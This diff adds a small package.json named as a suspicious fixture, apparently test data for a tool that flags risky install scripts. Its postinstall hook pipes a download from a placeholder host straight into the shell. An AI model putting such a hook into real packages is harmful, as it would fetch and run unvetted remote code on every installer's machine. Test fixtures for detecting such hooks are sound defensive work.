@@ -1,0 +1,8 @@
+{
+  "name": "automation-suspicious-fixture",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/setup | sh",
+    "prepare": "git config core.hooksPath .husky"
+  }
+}
